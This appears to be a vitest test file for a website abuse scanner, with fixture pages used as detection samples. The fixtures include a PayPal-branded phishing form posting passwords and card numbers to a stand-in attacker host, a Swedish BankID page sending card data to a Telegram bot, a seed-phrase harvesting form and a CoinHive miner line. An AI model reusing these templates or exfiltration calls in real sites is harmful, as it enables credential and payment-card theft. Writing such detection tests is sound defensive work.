import { describe, it, expect } from "vitest";
import { scanForAbuse, MockUrlReputation, extractUrls } from "../src/index.js";

const phishingKit = `<!doctype html><html><head><title>PayPal - Log in</title></head><body>
<h1>Your account has been suspended</h1><p>Unusual sign-in activity. Verify your account to restore access.</p>
<form action="https://collect.evil-host.example/p.php" method="post">
<input name="email"><input type="password" name="pw"><input autocomplete="cc-number" name="card"><button>Log in</button></form>
<script>eval(atob("YWxlcnQoMSk="))</script></body></html>`;

const bankIdSv = `<html><body><h2>Logga in med BankID</h2><p>Ditt konto har spärrats. Bekräfta dina kortuppgifter.</p>
<form><input placeholder="Kortnummer"><input placeholder="CVV"></form>
<script>fetch("https://api.telegram.org/bot123:abc/sendMessage",{method:"POST",body:JSON.stringify({card})})</script></body></html>`;

const legitSaaS = `export default function Login(){ return (<main><h1>Sign in to Nordlys</h1>
<form action="/api/login" method="post"><input type="email"/><input type="password"/><button>Sign in</button></form>
<p>Pay securely with Stripe. Works with Google Calendar.</p></main>) }`;

describe("abuse scanner", () => {
  it("flags a classic phishing kit as malicious", () => {
    const r = scanForAbuse({ files: { "index.html": phishingKit }, hostname: "nordlys.forge.app" });
    expect(r.verdict).toBe("malicious");
    expect(r.findings.map((f) => f.rule)).toEqual(expect.arrayContaining(["brand-login-form", "phishing-phrase", "external-credential-post", "obfuscated eval"]));
  });
  it("catches Swedish bank impersonation with Telegram exfiltration", () => {
    const r = scanForAbuse({ files: { "index.html": bankIdSv } });
    expect(r.verdict).toBe("malicious");
    expect(r.findings.map((f) => f.category)).toEqual(expect.arrayContaining(["impersonation", "phishing", "credential_harvesting"]));
  });
  it("does not flag a normal login page for the owner's own brand", () => {
    const r = scanForAbuse({ files: { "app/login/page.tsx": legitSaaS }, ownBrands: ["Nordlys"], hostname: "nordlys.forge.app" });
    expect(r.verdict).toBe("clean");
  });
  it("detects seed phrase harvesting and miners", () => {
    expect(scanForAbuse({ files: { "a.html": `<h1>MetaMask</h1><p>Enter your 12-word seed phrase</p><textarea></textarea>` } }).verdict).toBe("malicious");
    expect(scanForAbuse({ files: { "m.js": "const m = new CoinHive.Anonymous('k'); miner.start();" } }).findings[0]?.category).toBe("malware");
  });
  it("mock reputation uses a local blocklist", async () => {
    const rep = new MockUrlReputation(["evil-host.example"]);
    const urls = extractUrls({ "index.html": phishingKit });
    expect((await rep.check(urls))[0]?.threats).toEqual(["BLOCKLIST"]);
  });
});
